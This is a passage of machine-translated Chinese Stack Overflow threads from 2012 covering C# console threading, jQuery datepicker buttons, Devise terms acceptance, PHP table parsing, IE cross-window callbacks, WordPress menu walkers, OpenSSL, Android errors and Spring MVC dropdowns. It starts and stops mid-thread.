Population. Thread N 1 is running. Element N 3 has been added successfully.
Population. Thread N 1 is running. Element N 4 has been added successfully.
Population. Thread N 1 is running. Element N 5 has been added successfully.
Population. Thread N 1 is running. Element N 6 has been added successfully.
Population. Thread N 1 is running. Element N 7 has been added successfully.
Population. Thread N 1 is running. Element N 8 has been added successfully.
Population. Thread N 1 is running. Element N 9 has been added successfully.
Population. Thread N 1 is running. Element N 10 has been added successfully.
Population. Thread N 1 is running. Element N 11 has been added successfully.
Population. Thread N 1 is running. Element N 12 has been added successfully.
Population. Thread N 1 is running. Element N 13 has been added successfully.
Population. Thread N 1 is running. Element N 14 has been added successfully.
Population. Thread N 1 is running. Element N 15 has been added successfully.
Population. Thread N 1 is running. Populating list from 0 item in thread N 0...
Element N 16 has been added successfully.
Population. Thread N 0 is running. Element N 17 has been added successfully.
Population. Thread N 0 is running. Element N 18 has been added successfully.
Population. Thread N 0 is running. Element N 19 has been added successfully. 
```

在第 15 步和第 16 步之间，新的第一个开始运行并在锁定部分中的 Console.Write 和 Console.WriteLine 调用之间输出其内容... Console.WriteLine 确实是非线程安全的吗？或者我做错了什么？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:33:49.700

您有 2 个`AddItems`线程，每个线程都进行解锁输出（函数中的第一个）。这种交错是预期的行为。你需要：

```
 lock (SyncRoot)
  {
    Console.WriteLine("Populating list from {0} item in thread N {1}...", list.Count, threadNo); 
  } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:33:57.813

该行：

`Console.WriteLine("Populating list from {0} item in thread N {1}...", list.Count, threadNo);`

出现在同步块之外。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:55:39.780

您的某些代码位于锁定部分之外。第一件事：

```
int threadNo = threadsCount;
        threadsCount++; 
```

不是线程安全的。想象一个线程在增加线程计数之前启动并被第二个线程中断。两个线程都会有`threadNo = 0`

但这在这里似乎不是问题，尽管如果您使用它进行一些计算可能会导致问题。

正如其他人指出的那样：您还需要锁定 `Console.WriteLine("Populating list from {0} item in thread N {1}...", list.Count, threadNo);`，因此当下一个线程启动时，它会等待在控制台上写入，而另一个线程也在写入。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:35:02.817

Console.WriteLine("从线程 N {1} 中的 {0} 项填充列表...", list.Count, threadNo); 不在锁定区域内，因此可以随时打印，如您所见。

# jquery - Jquery DatePicker 自定义按钮

> ID：10499607
> 
> 赞同：1
> 
> 时间：2012-05-08T13:29:13.557
> 
> 标签：jquery, datepicker

我正在使用显示 Jquery datepicker 作为这样的内联

```
<div id="datepicker"></div> 
```

当我尝试在按钮窗格上添加自定义按钮时，按钮不会显示...当我将内联日期选择器替换为默认日期选择器时，即显示在文本字段自定义按钮上。

请给我一些想法，当显示为内联日期选择器时如何显示自定义按钮。

我使用以下代码显示自定义按钮

```
$("#datepicker").datepicker({
    showButtonPanel: true,
    beforeShow: function (input) {
        setTimeout(function () {
            var buttonPane = $(input)
                .datepicker("widget")
                .find(".ui-datepicker-buttonpane");

            var btn = $('<button class="ui-datepicker-current ui-state-default ui-priority-secondary ui-corner-all" type="button">Clear</button>');
            btn.unbind("click")
            .bind("click", function () {
                $.datepicker._clearDate(input);
            });

            btn.appendTo(buttonPane);

        }, 1);
    }
}); 
```

# ruby-on-rails - 设计，要求用户接受服务条款？

> ID：10499611
> 
> 赞同：10
> 
> 时间：2012-05-08T13:29:26.283
> 
> 标签：ruby-on-rails, ruby-on-rails-3, authentication, devise

我想强制所有用户接受服务条款，就像这里描述的一样：

[Ruby on Rails / Devise - 重置密码时绕过模型中的自定义验证选项](https://stackoverflow.com/questions/5762009/ruby-on-rails-devise-bypassing-custom-validation-option-in-model-when-resett)

但是，有两个要求使上述方法不适合。

1) 用户不是自行注册的，而是由系统管理员创建的。管理员显然不能代表用户接受条款和条件。应提示用户在首次登录时接受条款和条件。

2) 如果条款和条件事后发生变化。用户需要在后续登录时重新接受新条款。

这些似乎是非常标准的工作流程。设计是否提供任何方法来实现这一点？

如果没有，我认为这个检查需要在我的应用程序控制器上的 before_filter 中实现。（感觉将身份验证与应用程序逻辑混合在一起很脏......）

我是否必须诉诸于此，或者有人可以提出更好的方法吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-24T02:14:54.040

这不是设计可以处理的，设计也不应该处理，因为 TOS 与身份验证无关。

你可以做的是实现一个状态机，但这可能比你需要的更复杂。

简单的方法是在您的用户模型中添加一个accepted_tos 布尔字段并将其绑定到一个before_filter，然后您将在每次更新TOS 时将accepted_tos 设置为false。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-23T21:04:08.670

难道你不能在理论上禁止使用 JQuery 在你的应用程序中进一步移动吗？

禁用您的表单“继续”或“登录”按钮，直到他们选中一个框或点击继续按钮，然后启用您的登录按钮。

如果您需要存储该信息，只需在用户的数据库中创建一个列，当他们选中框或点击继续按钮时也会发布该列，或者您甚至可以利用登录次数作为一种了解方式。

如果 user.logs > 0 则用户已经接受了条款。
如果 user.logs == 0 则用户需要在登录前接受条款。

我想根据您的问题，将所有内容都绑定到 Devise 听起来过于复杂。

希望这可以帮助。

# php - 像字符串一样解析表

> ID：10499615
> 
> 赞同：0
> 
> 时间：2012-05-08T13:29:38.000
> 
> 标签：php, regex

我有一个表示数据库表的复杂字符串。而且我需要单独提取该数据库表来处理它们。

这是字符串示例：

```
First table
    | | {{Категория}} | | {{Стоимость курсов}} | {{Стоимость учебного набора}} |
    | 1 | Взрослый | 1 уровень = 50ч  | 1~500 лей | 15 евро |
    | 2 |   Студент, Мастерант, Докторант | 1 уровень = 50ч | 1~000 лей | 15 евро |
    | 3 | Ученик | 1 уровень = 50ч  | 1~000 лей | 15 евро |
    | 4 | Пенсионер | 1 уровень = 50ч  | 1~000 лей | 15 евро |
text text  text text text text
    Second table:
        | | {{Вид курсов}} | | {{Стоимость курсов}}| {{Стоимость учебного набора}} |
        | 1 | dfgdfgdfg | 1 модуль | 500 лей |  0 |
        |^|^| 2 модуля | 900 лей | 0 |
        |^|^| 4 модуля | 1~500 лей | 0 |
        | 2 | fgdfgdfg | 12ч | 800 лей | 0 |
        | 3 | dfgdfgdfgdfg| 12ч | 900 лей | 0 |
        |^|^| Предварительный тест | 400 лей | 0 |
text text text text text text 
```

我尝试使用这个正则表达式：`\|.+`但`preg_match_all()`只是转储数组中所有未分隔的表。请问有什么帮助吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T14:01:29.997

如我所见，您在一个字符串中有一组表。而且您需要将字符串拆分为表格。我假设您可以将字符串与文本分开，分隔表格。

```
<?php
$s = <<<EOSTR
First table
    | | {{Категория}} | | {{Стоимость курсов}} | {{Стоимость учебного набора}} |
    | 1 | Взрослый | 1 уровень = 50ч  | 1~500 лей | 15 евро |
    | 2 |   Студент, Мастерант, Докторант | 1 уровень = 50ч | 1~000 лей | 15 евро |
    | 3 | Ученик | 1 уровень = 50ч  | 1~000 лей | 15 евро |
    | 4 | Пенсионер | 1 уровень = 50ч  | 1~000 лей | 15 евро |
text text  text text text text
    Second table:
        | | {{Вид курсов}} | | {{Стоимость курсов}}| {{Стоимость учебного набора}} |
        | 1 | dfgdfgdfg | 1 модуль | 500 лей |  0 |
        |^|^| 2 модуля | 900 лей | 0 |
        |^|^| 4 модуля | 1~500 лей | 0 |
        | 2 | fgdfgdfg | 12ч | 800 лей | 0 |
        | 3 | dfgdfgdfgdfg| 12ч | 900 лей | 0 |
        |^|^| Предварительный тест | 400 лей | 0 |
text text text text text text
EOSTR;

$a = null;
$a = preg_split('/^(?:.(?<!\|))*$/xm', $s);
var_dump($a); 
```

就像这里： http: [//ideone.com/VCt4f](http://ideone.com/VCt4f)（使用[这个问题](https://stackoverflow.com/questions/876927/regex-for-matching-lines-that-do-not-contain-a-word)）。这会给你这个：

```
array(5) {
  [0]=>
  string(0) ""
  [1]=>
  string(506) "
    | | {{Категория}} | | {{Стоимость курсов}} | {{Стоимость учебного набора}} |
    | 1 | Взрослый | 1 уровень = 50ч  | 1~500 лей | 15 евро |
    | 2 |   Студент, Мастерант, Докторант | 1 уровень = 50ч | 1~000 лей | 15 евро |
    | 3 | Ученик | 1 уровень = 50ч  | 1~000 лей | 15 евро |
    | 4 | Пенсионер | 1 уровень = 50ч  | 1~000 лей | 15 евро |
"
  [2]=>
  string(1) "
"
  [3]=>
  string(466) "
        | | {{Вид курсов}} | | {{Стоимость курсов}}| {{Стоимость учебного набора}} |
        | 1 | dfgdfgdfg | 1 модуль | 500 лей |  0 |
        |^|^| 2 модуля | 900 лей | 0 |
        |^|^| 4 модуля | 1~500 лей | 0 |
        | 2 | fgdfgdfg | 12ч | 800 лей | 0 |
        | 3 | dfgdfgdfgdfg| 12ч | 900 лей | 0 |
        |^|^| Предварительный тест | 400 лей | 0 |
"
  [4]=>
  string(0) ""
} 
```

完成提取表后，您可以简单地将它们拆分为列

```
// $a = preg_split...

foreach ($a as $table) {
    if (!strlen(trim($table)))
         continue;

    $rows = preg_split('/\n/', $table);

    foreach ($rows as $row) {
        if (!strlen(trim($row)))
            continue;

        $columns = preg_split('/\|/', $row);

        // work with $columns array
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:32:53.990

您可以尝试在“|”上使用[explode()](http://ca3.php.net/explode)函数 和“”（空格）并以这种方式解析它。除此之外，我真的想不出任何其他方式。

```
$exploded = explode("|", $table);
$exploded = explode(" ", $table); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:44:05.887

只需将正则表达式与两次爆炸和一次迭代交换就更简单、更快捷

```
$table = array();
$rows = explode("\n", $string);

foreach($rows as $row)
    $table[] = explode("|", $row); 
```

现在我们有了一个二维数组结构，这样我们就可以很容易地以表格的形式回显出来，就像这样

```
echo "<table>";
foreach($table as $row) {
    echo "<tr>";

    foreach($row as $column)
        echo "<td>$column</td>";

    echo "</tr>";
}
echo "</table>"; 
```

# silverlight - 数据更改后未重新应用 PagedCollectionView 过滤器

> ID：10499619
> 
> 赞同：0
> 
> 时间：2012-05-08T13:29:48.673
> 
> 标签：silverlight, data-binding, pagedcollectionview

我在从 RIA 服务调用返回的一组实体上创建了一个 PCV。基本的东西。PCV 具有过滤器属性集。

当实体被更改（通过 UI 的不同功能）时，PCV 不会更新 --- 似乎没有任何证据表明正在为更改的实体重新评估过滤器。

每次集合中的某些内容发生更改以使 PCV 更新它返回到绑定 ItemsSource 的数据集时，我们是否必须手动重置过滤器属性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T20:58:47.743

你可以看看这些：PagedCollectionView.NeedsRefresh [http://msdn.microsoft.com/en-us/library/system.windows.data.pagedcollectionview.needsrefresh(v=vs.95).aspx](http://msdn.microsoft.com/en-us/library/system.windows.data.pagedcollectionview.needsrefresh(v=vs.95).aspx)

和 PagedCollectionView.Refresh [http://msdn.microsoft.com/en-us/library/system.windows.data.pagedcollectionview.refresh(v=vs.95).aspx](http://msdn.microsoft.com/en-us/library/system.windows.data.pagedcollectionview.refresh(v=vs.95).aspx)

# javascript - 无法在 IE 中将函数从一个窗口传递到另一个窗口

> ID：10499623
> 
> 赞同：9
> 
> 时间：2012-05-08T13:30:13.553
> 
> 标签：javascript, internet-explorer, function, window.opener

我有两个窗口，一个是从另一个打开的，所以，我`opener`在“子”窗口中有一个属性。

父窗口在全局范围内有一些函数，必须以函数作为第一个参数调用（它将用作回调）。

两个页面都是从同一个域打开的，所以，我没有任何同源策略限制（我希望如此）......

在子窗口中，我有这样的代码

```
if(window.opener) {
    window.opener.myFunction(function() { ... });
} 
```

一切正常，直到我尝试在 IE 中运行它。在此浏览器中，由 接收的参数`myFunction`始终是类型`Object`（用 选中`typeof`）。代码`myFunction`是这样的：

```
window.myFunction = function(cb) {
    alert('Callback type is ' + (typeof cb));
    if(typeof cb == 'function') 
        cb();
    else
        alert('Not a function!');
} 
```

现场演示：[http ://elifantiev.ru/ie-opener-issue/first.html](http://elifantiev.ru/ie-opener-issue/first.html)

问题是：

1.  这是符合标准的行为吗？
2.  这个问题有一些解决方法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-09T21:42:28.523

即使 typeof 返回“object”，该函数仍然按预期工作。调用`cb()`将执行该函数。

`typeof`用于确定参数是否为函数的替代方法是测试所有函数都应具有的调用属性：

```
if (cb && cb.call) { cb(); } 
```

如果你传递给需要一个函数的东西，它可以像这样包装：

```
function newCb() {
    return cb.apply(object, arguments);
} 
```

另请注意，将函数从父级传递给子级时，typeof 也是对象。将原始函数与作为对象的函数（在往返之后）进行比较返回 true。如果由于某种原因您需要对原始函数的引用（例如退订时），这一点很重要。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T04:03:57.130

看来这是设计使然。

[这是一篇关于它的文章](https://web.archive.org/web/20150412000709/http://www.kilometer0.com/blog/code/internet-explorer-ie-cross-window-javascript-object-typeof-bug/)

[https://bugzilla.mozilla.org/show_bug.cgi?id=475038](https://bugzilla.mozilla.org/show_bug.cgi?id=475038)

因为每个窗口可以有不同的原型链，所以函数不能按预期传递。尝试做这样的事情来确认：

```
 var popup = window.open('second.html');

   window.myFunction = function(cb) {
            alert(cb instanceof Function);       //false
            alert(cb instanceof popup.Function); //true
   } 
```

因此，如果在父端需要担心许多函数（我讨厌原型，但这次我认为你被卡住了），这就是我将如何进行正确的函数验证的方法：

父窗口：

```
<html>
<script type="text/javascript">
    /* give all our functions the validation check at once */
    Function.prototype.remote = function(cb) {
        if(cb instanceof popup.Function) {
            this(cb);
        } else {
            alert('Not a function!');
        }
    };

    var popup,
    myFunction = function(cb) {
        cb();
    },
    test = function(cb) {
        cb();
    }

</script>   
<body>
    <a href="#" onclick="popup = window.open('second.html'); return false;">Open window</a>
</body>
</html> 
```

子窗口：

```
<html>
<body>
    <script type="text/javascript">
        var Parent = window.opener;
        if(Parent) {
            Parent.myFunction.remote(function(){
                alert('callback!');
            });

            Parent.test.remote(function() {
               alert('callback again');
            });
        }
    </script>
    This is a second page!
</body>
</html> 
```

这是一个工作示例： [http ://dl.dropbox.com/u/169857/first.html](http://dl.dropbox.com/u/169857/first.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-17T18:23:11.957

即使你现在可以让它工作，我也不指望两个浏览器窗口直接调用彼此的函数的能力会持续更长时间。即使您从场景中删除了跨域问题，也存在太多安全问题。

做到这一点并确保它适用于所有浏览器的唯一面向未来的方法是使用所有现代浏览器（包括 IE8 及更高版本）都支持的[跨文档消息传递 API 。](http://en.wikipedia.org/wiki/Cross-document_messaging)

当我需要解决这个问题时，我能找到的最详细的例子是[MDN 上的这篇 window.postMessage 文章](https://developer.mozilla.org/en/DOM/window.postMessage)。

它归结为一侧的电话以发布消息，例如：

```
otherWindow.postMessage(message, targetOrigin); 
```

然后是另一边的事件处理程序：

```
window.addEventListener("message", receiveMessage, false);

function receiveMessage(event)
{
  alert("I got it!\n" + event.data);
} 
```

如果窗口来自同一个域，IE6 和 IE7 可能现在允许你进行这些跨窗口调用，但 IE8 及更高版本可能希望你使用这个 API，我猜其他浏览器最终会完全恢复到这种更安全的通信机制。

鉴于这种情况，我强烈建议使用共享库来共享您的代码（使用 LAB.js 或 require.js 甚至只是 Jquery 的 getScript() 函数），然后使用跨文档消息传递系统发送事件，而不是您今天尝试使用的回调函数。

更新

* * *

有一些 polyfill 可用于为旧版浏览器添加 postMessage 支持。由于您不进行跨域调用，我将从 Ben Alman 的[Jquery postMessage plugin](http://benalman.com/projects/jquery-postmessage-plugin/)开始。我没用过，但我用过 Ben 的优秀 Jquery BBQ 插件。如果支持，它应该回退到内置方法，并且仅在旧浏览器中的替代方法中填充。它声称可以在IE7中工作...

如果 Ben 的插件不能解决问题，那么您可以尝试 easyXDM，但设置起来看起来有点复杂。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-05-17T15:30:05.777

打开子窗口后，您可以将父级创建的函数注册到其`window`上下文中。[您可以在jsFiddle](http://jsfiddle.net/rAQ2p/6/)中看到以下代码运行：

```
<html>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script>

// will be called by the child window
function MyExportedCallback(x) {
    $("#my-callback-result").text("this callback was run with '" + x + "'.");
}

// will open a child window and create content for testing
function MyLinkHandler() {
    var wnd = window.open("about:blank");

    // IMPORTANT: this is where the parent defined function is "registered"
    // into child window scope
    wnd["myExternal"] = MyExportedCallback;

    // auxiliary code to generate some HTML to test the external function
    var put = function(x) { wnd.document.write(x); };
    put("<html><body>");
    put("<a href='#' onclick='window.myExternal(123);'>");
    put("click me to run external function");
    put("</a>");
    put("</body></html>");
}

// attach events
$.ready(function() {
    $("#my-link").click(MyLinkHandler);
});

</script>
<body>
<p><a id="my-link" href="#">Open window</a></p>
<p id="my-callback-result">waitting callback...</p>
</body>
</html> 
```

# php - PHP/Wordpress - 将一个类附加到一个孩子

> ID：10499624
> 
> 赞同：0
> 
> 时间：2012-05-08T13:30:16.707
> 
> 标签：php, wordpress, menu, children

我正在尝试将类附加到`<ul>`标签内的`<li>`标签（即 child `<ul>`）

它用于 Wordpress 菜单，因此我需要为 Walker_Nav_Menu 扩展创建一个函数并在代码中调用它。

我已经能够为任何`<li>`有孩子的人附加课程，但我还需要为那个孩子开设课程。

我当前的代码在下面并且可以工作（除了伪代码）：

```
class children_classes extends Walker_Nav_Menu {
    function display_element($element, &$children_elements, $max_depth, $depth, $args, &$output) {

        $id_field = $this->db_fields['id'];

    //If the current element has children, add class 'dropdown'
    if(isset($children_elements[$element->$id_field])) { 
        $classes = empty($element->classes) ? array() : (array) $element->classes;
        $classes[] = 'dropdown';
        $element->classes = $classes;

        // Pseudo-code
        Get child ul
          Attach class "dropdown-menu"
        // End psuedo-code
    }

    // We don't want to do anything at the 'top level'.
    if(0 == $depth)
        return parent::display_element($element, $children_elements, $max_depth, $depth, $args, $output);

    return parent::display_element($element, $children_elements, $max_depth, $depth, $args, $output);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:58:37.097

将此添加到您的 Walker 课程中：

```
function start_lvl(&$output, $depth)
{
    $indent = str_repeat("\t", $depth);
    $output .= "\n$indent<ul class='sub-menu custom-class'>\n";
} 
```

这将覆盖默认的 start_lvl 函数以添加类或您可能需要的任何其他内容，但是您需要。

# c - Openssl：做 RSA_verify() 和 X509_verify_cert() 使用通用的 RSA 验证码

> ID：10499625
> 
> 赞同：0
> 
> 时间：2012-05-08T13:30:26.640
> 
> 标签：c, linux, openssl

RSA_verify [()](http://linux.die.net/man/3/rsa_verify)和 [X509_verify_cert()](http://www.openssl.org/docs/crypto/X509_verify_cert.html)是否使用任何常见的 RSA 签名验证码？（我的意思只是签名验证部分）。

我浏览了 openssl 源代码，但无法弄清楚。X509_verify_cert() 最后似乎使用了 ASN1_verify() ，而 RSA_verify() 似乎没有使用它。

一些有价值的意见表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T15:54:53.800

我找到了。X509_verify_cert 使用 RSA_verify

# programming-languages - 使用什么语言创建 Google 自动驾驶汽车软件？

> ID：10499636
> 
> 赞同：15
> 
> 时间：2012-05-08T13:31:03.507
> 
> 标签：programming-languages, artificial-intelligence

我已经搜索过，但无法找到任何有关此的信息。还从软件的角度对系统的整体架构感兴趣。他们从雷达/激光/全球定位系统和轮胎跟踪中实时收集大量信息，以构建和维护“世界模型”——我很好奇是用什么来创建这个的。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-11T18:37:40.990

[关于编程语言：正如 Sebastian Thrun 在 Udacity 的“CS373：编程机器人汽车”的](http://www.youtube.com/watch?v=QFDBs7kJLhM&feature=player_embedded#t=230s)一个办公时间会话中所说：

> 几乎所有的代码都是用 C++ 编写的。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-05-08T20:38:20.403

当您研究 Google 自动驾驶汽车软件时，为什么编程语言会吸引您？恕我直言，与使用 C++ 或 Python 或 LISP 编写的算法相比，算法看起来更有吸引力。

例如，Google Map Reduce 是用 C++ 编写的。开源社区阅读了研究论文，理解了算法，总结了将问题分解为数据并行算法的全部内容，然后用 Java 编写了它，Java 被普遍称为 Apache Hadoop。因此，它从来都不是关于 C++ 或 Java 的，而是关于解决数据并行问题的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-10-28T16:29:34.710

尽管大多数生产代码必须用 C++ 编写，但在模型训练和实验阶段也应该大量使用 Python。

# java - Android 我得到 Java.lang.NoClassDefFoundError

> ID：10499637
> 
> 赞同：0
> 
> 时间：2012-05-08T13:31:06.550
> 
> 标签：java, android, exception

这是我得到的错误：

```
05-08 12:50:56.976: E/AndroidRuntime(1018): java.lang.NoClassDefFoundError:
nl.h.energy.android.userinterface.FragmentEnergyUsage 
```

我使用了断点，我确定错误在这一行

```
1   bar.addTab(bar.newTab()
2     .setText("energy usage")
3     .setTabListener( 
4     new nl.h.energy.android.helper.TabListener
5      <nl.h.energy.android.userinterface.FragmentEnergyUsage>
6       (this,"energyUsage",  
7        nl.h.energy.android.userinterface.FragmentEnergyUsage.class))); 
```

错误发生在第 6/7 行我希望我提供了足够的信息。这些类是我自己编写的类，所以我必须导入这些类或 Android 中缺少这些类没有问题

TabListener 看起来像这样：http: [//developer.android.com/reference/android/app/ActionBar.html#newTab](http://developer.android.com/reference/android/app/ActionBar.html#newTab) ()

FragmentEnergyUsage 类看起来像这样：

```
package nl.h.energy.android..userinterface;

import nl.h.energy.userinterface.R;
import android.os.Bundle;
import android.app.Fragment;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;

public class FragmentEnergyUsage extends Fragment {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e("Test", "hello");
    }

    @Override
    public void onActivityCreated(Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);

    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.energy_usage, container, false);
        return view;
    }

    public void setText(String item) {
        TextView view = (TextView) getView().findViewById(R.id.detailsText);
        view.setText(item);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:42:01.550

看到这个[答案](https://stackoverflow.com/questions/10046298/android-update-17-seems-incompatible-with-external-jars/10046725#10046725)

还要检查您是否在清单文件中注册了所有活动类？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T11:50:59.313

我拿到

```
 java.lang.NoClassDefFoundError: com.android.example.SupportFragment
    at com.android.example.SupportFragmentActivity.onCreate() 
```

上

```
SupportFragment extends SherlockFragment implements PopupMenu.OnMenuItemClickListener
...
    @Override
    public boolean onMenuItemClick(android.view.MenuItem item) {
        return onOptionsItemSelected(item);
    } 
```

当尝试使 api 17 应用程序与 api 8 兼容时，唯一的指示是上面的 logcat 错误，因此如果遇到此错误，请检查是否支持所有导入的类。

# html - RadiobuttonFor 不适用于集合内的属性（ASP.Net MVC3）

> ID：10499639
> 
> 赞同：1
> 
> 时间：2012-05-08T13:31:31.247
> 
> 标签：html, asp.net-mvc-3, view, html-helper

我的视图模型看起来像：

```
public class ShippingInfo
{
    public string DiagID { get; set; }

    public Collection<AddressInfo> AddressSuggestions { get; set; }
}

public class AddressInfo
{
    public int ID { get; set; }
    public string CompleteAddressInfo { get; set; }
} 
```

当我尝试在单击按钮时发布表单时，单选按钮选择不会保留在我的操作方法中。

我是否需要像在下拉列表中那样使用另一个变量来存储选择？

```
@if (Model.AddressSuggestions != null)
    {
    for (int i = 0; i < Model.AddressSuggestions.Count; i++)
    {
        AddressInfo m1 = Model.AddressSuggestions[i];
        @Html.RadioButtonFor(m => m1.CompleteAddressInfo, m1.ID)
        <span>@Model.AddressSuggestions[i].CompleteAddressInfo</span>
        <br/>
    }
    } 
```

当我发布表单（模型绑定）时，我希望我的单选按钮选择应该保留在模型中。如果有人在我的代码中指出问题，我将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:35:08.670

`@`在您的助手调用之前使用`Html.RadioButtonFor`，否则您不会向视图输出任何内容。还要摆脱`;`这个助手调用结束时的：

```
@if (Model.AddressSuggestions != null)
{
    for (int i = 0; i < Model.AddressSuggestions.Count; i++)
    {
        @Html.RadioButtonFor(
            m => m.AddressSuggestions[i].CompleteAddressInfo, 
            Model.AddressSuggestions[i].CompleteAddressInfo
        )
    }
} 
```

另外，我不知道您对`false`参数的含义是什么，但是此帮助器没有重载需要布尔值。助手的第二个参数表示如果相应的模型属性值匹配，将使单选按钮检查的值。

因此，例如，如果您希望每行有 2 个互斥单选按钮：

```
for (int i = 0; i < Model.AddressSuggestions.Count; i++)
{
    <span>Value 1</span>
    @Html.RadioButtonFor(
        m => m.AddressSuggestions[i].CompleteAddressInfo, 
        "value1"
    )

    <span>Value 2</span>
    @Html.RadioButtonFor(
        m => m.AddressSuggestions[i].CompleteAddressInfo, 
        "value2"
    )
} 
```

现在，如果`Model.AddressSuggestions[i].CompleteAddressInfo`等于`value1`，则将预选第一个单选按钮，如果等于`value2`，则预选第二个单选按钮。

再一次，这将取决于您要实现的目标以及您的模型所持有的价值。

# java - 如何在 Spring MVC 中填充下拉框

> ID：10499641
> 
> 赞同：11
> 
> 时间：2012-05-08T13:31:36.423
> 
> 标签：java, spring, jsp, spring-mvc, drop-down-menu

我一直在尝试找出如何在 Spring MVC 中填充下拉框。关于这个主题有一些线程，但我发现它们都没有帮助我，所以我希望这里有人可以帮助我。

这是我的控制器：

```
@Controller
@RequestMapping("/document-revision") 
public class DocumentRevisionController {

@Autowired
private DocumentRevisionService documentRevisionService;
private DocumentService documentService;

@RequestMapping(value="/list", method=RequestMethod.GET) 
public String getDocumentRevisionList(Model model) {
    List<DocumentRevision> documentRevisions = documentRevisionService.retrieveAllDocumentRevisions();
    model.addAttribute("documentRevisions", documentRevisions);

    return "document-revision";
}

@RequestMapping(value="/add", method=RequestMethod.GET)
public String getDocumentRevision(Model model) {
    DocumentRevision documentRevision = new DocumentRevision();
    model.addAttribute("documentRevisionAttribute", documentRevision);
    return "new-documnent-revision";
}

@RequestMapping(value="/add", method=RequestMethod.POST)
public String postDocumentRevision(@ModelAttribute("documentRevisionAttribute") @Valid DocumentRevision documentRevision, BindingResult result) {

    if(result.hasErrors()){
        return "new-document-revision";
    }

    documentRevisionService.createDocumentRevision(documentRevision);
    return "redirect:/testapp/document-revision/list";  
}

} 
```

这是jsp页面：

```
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@ taglib uri="http://www.springframework.org/tags/form" prefix="form" %>

<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Insert title here</title>
        <style>
        .error { color: red; }
        </style>
</head>
<body>

    <h1>Create New Document Revision</h1>

    <c:url var="saveUrl" value="/testapp/document-revision/add" />
    <form:form modelAttribute="documentRevisionAttribute" method="POST" action="${saveUrl}">
        <table>
            <tr>
                <td>DocumentNumber</td>
                <td><form:select path="document_number">
                    <form:option value="NONE" label="--- Select ---" />
                    <form:options items="${documentNumberList}" />
                    </form:select>
                </td>
                <td><form:errors path="document_number" cssClass="error" /></td>
            </tr>

            <tr>
                <td><form:label path="documentRState">Document R-State</form:label></td>
                <td><form:input path="documentRState"/></td>
                <td><form:errors path="documentRState" cssClass="error"/></td>
            </tr>

        </table>

        <input type="submit" value="Save" />
    </form:form>

</body>
</html> 
```

我尝试添加一个检索文档编号的@ModelAttribute 方法，

```
 @ModelAttribute
    public List<Document> documentNumberList(){
        return documentService.retrieveAllDocumentNumbers();
    } 
```

但它给了我错误。有没有人知道应该怎么做？

感谢您的时间

/D

**编辑**我想我会澄清我的愿望是为documentService检索的文档编号提供一个下拉框。

**编辑 2**这是所要求的错误日志：

```
java.lang.NullPointerException
testapp.controller.DocumentRevisionController.documentNumberList(DocumentRevisionController.java:33)
sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
java.lang.reflect.Method.invoke(Method.java:601)
org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:212)
org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:126)
org.springframework.web.method.annotation.ModelFactory.invokeModelAttributeMethods(ModelFactory.java:123)
org.springframework.web.method.annotation.ModelFactory.initModel(ModelFactory.java:97)
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:614)
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:578)
org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:80)
org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:900)
org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:827)
org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882)
org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:778)
javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
javax.servlet.http.HttpServlet.service(HttpServlet.java:722) 
```

**解决方案**我想我会添加完整的控制器代码，以防有其他人可以从中受益：

```
@Controller
@RequestMapping("/document-revision") 
public class DocumentRevisionController {

@Autowired
private DocumentRevisionService documentRevisionService;

@Autowired
